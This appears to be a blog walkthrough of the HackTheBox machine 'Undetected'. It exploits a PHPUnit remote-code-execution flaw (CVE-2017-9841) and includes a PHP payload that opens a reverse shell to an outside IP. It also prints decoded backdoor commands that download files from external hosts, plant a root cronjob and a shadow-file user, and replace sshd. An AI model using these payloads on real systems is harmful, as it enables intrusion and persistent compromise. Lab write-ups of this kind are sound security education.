---
title: "HackTheBox: \"Undetected\" Walkthrough"
date: 2022-04-25T18:08:18+02:00
tags: ['hackthebox', 'ctf']
slug: "hackthebox-undetected-walkthrough"
categories: ["HackTheBox Walkthrough"]
sidebar: false
#summary: "custom summary"
draft: true
---

I think this is one of my favourite machines on HackTheBox. It took quite some
time, especially because I was following a false trail for a long time - but after
being back on track, it was a really fun challenge.<!--more-->

## Foothold

We start by visiting the landing page. Only static content, but with
one interesting link to `store.djewelry.htb` - which is another site and
powered by PHP. A directory scan quickly reveals a reachable `vendor/` dir,
which even has directory listing enabled. From there, we navigate to
`composer/installed.json` and inspect the installed packages and their versions.
We find version 5.6.2 of phpunit, which is susceptible for CVE-2017-9841:

> Util/PHP/eval-stdin.php in PHPUnit before 4.8.28 and 5.x before 5.6.3 allows
remote attackers to execute arbitrary PHP code via HTTP POST data beginning with
a "<?php " substring, as demonstrated by an attack on a site with an exposed /vendor
folder, i.e., external access to the /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php URI.

## User

In order to avoid character escaping issues, we create a new file with name "data" and the payload:
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"); ?>
```
... send it to the server via curl ...
```plain
$ curl http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -d @data
```
... and have a reverse shell - but for now only as "www-data" user.
After looking around a bit, there is no obvious way forward, so we need to ask
LinPEAS, which points us to an unusual cronjob:
```plain
* 3 * * * root /var/lib/.main
```
We also note that there are two users with the same uid:
```plain
steven1:x:1000:1000:,,,:/home/steven:/bin/bash
steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash
```
Furthermore, this user also seems to have some mails:
```plain
17793      4 -rw-rw----   1 steven   mail          966 Jul 25  2021 /var/mail/steven
17793      4 -rw-rw----   1 steven   mail          966 Jul 25  2021 /var/spool/mail/steven
```
Last but not least, there is this file:
```plain
/var/backups/info
```

I thought starting with the cronjob is a good idea. It's a binary file and I tried to
figure out what it does - by using Ghidra and by executing it, together with ptrace/strace.
But I made no progress at all. A few hours later, the machine was updated and the changelog said:

> Removed the .main file as it was not a part of the intended path and was causing issues.

Well, back to square one. The next candidate was `/var/backups/info`, another binary
file - let's just run it:
```plain
www-data@production:/tmp$ /var/backups/info
/var/backups/info
[-] substring 'ffff' not found in dmesg
[.] starting
[.] namespace sandbox set up
[.] KASLR bypass enabled, getting kernel addr
```
When searching for "KASLR bypass enabled, getting kernel addr", we find some
[exploit poc code](https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c)...
but it's no longer working, at least on this machine. What could we possibly
do with an exploit that's no longer working?

It really took some time until the idea came: Let's try to see if there is a
payload inside and if so, what was it doing? Usin the `strings` command on this file
shows some noise, but a long hexadecimal string stands out. We put that
string into [CyberChef](https://gchq.github.io/CyberChef/) and see:
```plain
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys;wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" >> /etc/crontab; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd; while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt; rm users.txt;
```
What exactly is happening?

* `/root/.ssh/authorized_keys` is overwritten - but we don't have the private key, so not useful for us.
* `/var/lib/.main` is downloaded and installed as cronjob. We already know this is a false trail.
* A new user (with a trailing "1") is inserted into `/etc/shadow`, and we can also see the hashed password.
That looks promising!

So we put that hash into hashcat, `su steven1` and done - we now have user access.

## Root

We also remember that there was some mail, which we are now able to read:

> Hi Steven.
>
>We recently updated the system but are still experiencing some strange behaviour with the Apache service.
>We have temporarily moved the web store and database to another server whilst investigations are underway.
>If for any reason you need access to the database or web application code, get in touch with Mark and he
>will generate a temporary password for you to authenticate to the temporary server.
>
>Thanks,
>sysadmin

So the next hint is: Apache. The site configuration does not have any interesting content,
but one file stands out with an unique modification timestamp in the `mods-enabled` directory.
It's `reader.load` with the following contents:

```plain
LoadModule reader_module      /usr/lib/apache2/modules/mod_reader.so
```

This seems like a... non-standard module. As we already had success with the
`strings` command, we also throw it at this file. Again a long string stands out,
but this time it looks base64 encoded. Decoding it, we see:

```plain
wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin
```

Ok, so the `sshd` was replaced on this machine - probably with some backdoored version.

I wondered: Where would I put a backdoor? Either in the password or in
the public key authentication. In either case, I'd put some hard coded secret
in the code. The sshd codebase is rather small, and I searched for the function(s)
responsible for password authentication and found `auth_password`.
Luckily, the backdoored sshd on the machine was compiled with debug symbols, so
I searched for the `auth_password` method. Here is the relevant snippet
which Ghidra decompiled:

```c
bVar7 = 0xd6;
backdoor._28_2_ = 0xa9f4;
backdoor._24_4_ = 0xbcf0b5e3;
backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
backdoor[30] = -0x5b;
backdoor._0_4_ = 0xf0e7abd6;
backdoor._4_4_ = 0xa4b3a3f3;
backdoor._8_4_ = 0xf7bbfdc8;
backdoor._12_4_ = 0xfdb3d6e7;
pbVar4 = (byte *)backdoor;
while( true ) {
    pbVar5 = pbVar4 + 1;
    *pbVar4 = bVar7 ^ 0x96;
    if (pbVar5 == local_39) break;
    bVar7 = *pbVar5;
    pbVar4 = pbVar5;
}
iVar2 = strcmp(password,backdoor);
uVar3 = 1;
if (iVar2 != 0) {
    // continue with normal authentication ...
```
*(Fun fact: I later went through this machine with another person, and after
opening Ghidra he searched for "backdoor" right away - really good intuition
I'd say!)*

### The lazy way

The first way I tried was the lazy and potentially dangerous one, because
I'd run the compromised sshd on my machine (well, in a VM) and attach
gdb to it:
```plain
$ gdb --args /home/kali/htb/undetected/sshd -h /home/kali/htb/undetected/id_rsa -D -d -p 2222
```

* Set a breakpoint at `auth_password`
* Step through the `while`-loop
* Dump the contents of the `backdoor` variable
* Login via SSH with user "root" and the password we just obtained - done!

*Of course that's something I'd never do with a "random" binary (or I'd put more
security measures in place, like disconnecting the network and so on).
Still, on HackTheBox I'd assume that there are no outright malicious files on the
machine.*

### The better way

The next day, I wanted to it "right", that is, reverse the obfuscation.
If we take a moment and look at the code, what is really happening?
* `pbVar4` points to the start of the character / byte array
* `pbVar5` points to the next byte / element of the array
* The current position (`pbVar4`/`bVar7`) is XORed with `0x96`
* `pbVar4`/`bVar7` are moved to the next byte / element

So what really happens is that every character is XORed with `0x96` - that's it.
The following python script will apply the same transformation.

```python
from binascii import unhexlify

hex = "f0e7abd6 a4b3a3f3 f7bbfdc8 fdb3d6e7 b2d6f4a0fda0b3d6 bcf0b5e3 a9f4 a5"
backdoor = ""

for hex_bytes in hex.split(" "):
    bytes = unhexlify(hex_bytes)
    for byte in bytes[::-1]:
        backdoor += chr(byte ^ 0x96)

print(backdoor)
```

The `unhexlify` function does not accept signed bytes, so ne need to convert
`-0x5b` to an unsigned value using, for example, `hex(-0x5b & 0xff)`.

## Conclusion and Learnings

For me, this was the most realistic machine I did until now. Having
a public `vendor/` dir is gross negligence, but it can happen. To be honest,
I had a project some years ago where exactly this was the case!
If maintenance is lacking, vulnerable package versions are also to be expected -
and `phpunit` is a widely used package. Granted, packages like
phpunit should be under "require-dev" in your `composer.json`
and only installed in dev/test environments. But even then, you would need to run
composer together with the `--no-dev` flag on the production system, otherwise
the dev packages will also get installed. Those mistakes all seem plausible.

Furthermore, having a machine that already was hacked some time ago and equipped with
a backdoor also seems plausible. I'd expect the attacker to have cleaned up
a bit better - but then this is still a HackTheBox machine with "medium"
difficulty, so there should be some clues lying around.
